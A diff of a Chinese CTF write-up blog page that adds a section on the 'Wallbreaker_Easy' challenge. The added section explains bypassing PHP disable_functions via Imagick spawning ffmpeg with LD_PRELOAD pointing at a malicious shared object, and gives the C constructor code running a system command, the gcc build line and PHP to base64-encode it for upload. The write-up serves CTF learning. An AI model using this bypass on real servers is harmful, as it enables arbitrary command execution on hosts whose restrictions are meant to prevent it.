@@ -89,7 +89,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-强网杯-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">0x 01 强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CISCN2019-华东南赛区-Web11"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [CISCN2019 华东南赛区]Web11</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-强网杯-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">0x 01 强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CISCN2019-华东南赛区-Web11"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-Wallbreaker-Easy"><span class="toc-number">3.</span> <span class="toc-text">0x 03 Wallbreaker_Easy</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -115,7 +115,7 @@
       
         <time datetime="2020-03-18T13:58:27.000Z" itemprop="datePublished">2020-03-18</time>
         
-        (Updated: <time datetime="2020-03-19T15:53:12.959Z" itemprop="dateModified">2020-03-19</time>)
+        (Updated: <time datetime="2020-03-21T16:59:09.421Z" itemprop="dateModified">2020-03-22</time>)
         
       
     </div>
@@ -209,6 +209,34 @@
 <blockquote>
 <p><a href="https://www.freebuf.com/column/219913.html" target="_blank" rel="noopener">https://www.freebuf.com/column/219913.html</a></p>
 </blockquote>
+<h3 id="0x-03-Wallbreaker-Easy"><a href="#0x-03-Wallbreaker-Easy" class="headerlink" title="0x 03 Wallbreaker_Easy"></a>0x 03 Wallbreaker_Easy</h3><ul>
+<li><p>考点</p>
+<p>disable_function bypass</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>攻击思路</li>
+</ol>
+<p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行。</p>
+<ol start="2">
+<li>编写hack.c</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;8810490ee01835952ff9359d77cce4bd&#x2F;lxj.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件</p>
+<p>获取so文件的base64值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'1.txt'</span>,base64_encode(file_get_contents(<span class="string">'P3rh4ps.so'</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传文件并执行</p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://p3rh4ps.top/index.php/2020/01/12/20-1-12-总结/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/01/12/20-1-12-%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p>
+<p><a href="https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD劫持类型题目/" target="_blank" rel="noopener">https://ch4ser-go.github.io/2019/12/26/LD-PRELOAD%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</a></p>
+<p><a href="https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/" target="_blank" rel="noopener">https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</a></p>
+</blockquote>
 
   </div>
 </article>
@@ -236,7 +264,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-强网杯-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">0x 01 强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CISCN2019-华东南赛区-Web11"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [CISCN2019 华东南赛区]Web11</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-强网杯-2019-Upload"><span class="toc-number">1.</span> <span class="toc-text">0x 01 强网杯 2019]Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CISCN2019-华东南赛区-Web11"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [CISCN2019 华东南赛区]Web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-Wallbreaker-Easy"><span class="toc-number">3.</span> <span class="toc-text">0x 03 Wallbreaker_Easy</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
